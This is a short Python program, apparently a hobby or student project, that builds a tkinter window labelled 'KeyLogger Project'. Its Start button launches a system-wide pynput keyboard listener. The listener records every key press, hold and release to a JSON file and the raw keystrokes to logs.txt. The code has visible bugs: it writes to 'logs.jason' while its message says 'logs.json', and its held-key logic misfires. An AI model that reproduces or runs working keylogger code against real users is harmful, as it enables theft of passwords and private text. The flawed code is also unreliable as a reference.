import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root=tk.Tk()
root.geometry("200x200")
root.title("KeyLogger Project")
root.configure(bg='lightblue')

key_list=[]
x=False
key_strokes=""

def  update_text_file(key):
    with open('logs.txt','w+') as keys:
        keys.write(key)
        
def update_json_file(key_list):
    with open('logs.jason','+wb') as key_log:
        key_list_bytes=json.dumps(key_list).encode()
        key_log.write(key_list_bytes)
        
def on_press(key):
    global x, key_list
    if x==False:
        key_list.append({'Pressed': f'{key}'})
        x=True
    if x==True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global  x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x==True:
        x=False
    update_json_file(key_list)
    key_strokes=key_strokes+str(key)
    update_text_file(key_strokes)


def butaction():
    
    print("[+] Running KeyLogger Successfully!\n[!] Saving the Key logs in 'logs.json'")

    with keyboard.Listener(
        on_press=on_press,on_release=on_release) as listener:
        listener.join()

def butaction1():
    exit()
    
empty=Label(root, text="        KeyLogger Project", font='Times').grid(row=2,column=3)
Button(root,text="Start", command=butaction).grid(row=5,column=3)
Button(root,text="Stop", command=butaction1).grid(row=8,column=3)
root.mainloop()
    
